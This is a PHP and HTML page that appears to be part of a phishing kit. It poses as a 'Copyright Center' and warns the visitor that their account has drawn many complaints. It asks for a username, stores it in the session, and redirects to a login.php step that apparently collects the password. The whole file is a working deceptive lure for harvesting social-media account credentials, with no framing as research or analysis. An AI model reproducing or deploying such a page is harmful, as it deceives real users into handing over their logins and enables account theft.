<?php
ob_start();
session_start();
set_time_limit(0);
error_reporting(0);

if ($_POST) {

  $blind=$_POST["blndsc"];
  $_SESSION["blndsc"]=$blind;
  

        header("location: login.php");
    }
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/css/all.min.css">
    <link rel="stylesheet" href="./assets/style.css">
    <link href="https://fonts.googleapis.com/css2?family=Montserrat&display=swap" rel="stylesheet">
    <title>Copyright Notices</title>
</head>
<body>
    <section class="side">
        <img src="./assets/images/img.svg" alt="">
    </section>

    <section class="main">
        <div class="login-container">
            <p class="title">Copyright Center</p>
            <div class="separator"></div>
            <p class="welcome-message">We have received a lot of complaints about your account. If you think there is an erroneous complaint, continue by entering your information.<br><br>Information will be given in the next steps.</p>

            <form class="login-form" method="post">
                <div class="form-control">
                    <input type="text" placeholder="Username" required name="blndsc">
                    <i class="fas fa-user"></i>
                </div>
                
                <!--<div class="form-control">
                    <input type="password" placeholder="Password">
                    <i class="fas fa-lock"></i>
                </div>-->
                <button class="submit">Next</button>
            </form>
        </div>
    </section>
    
</body>
</html>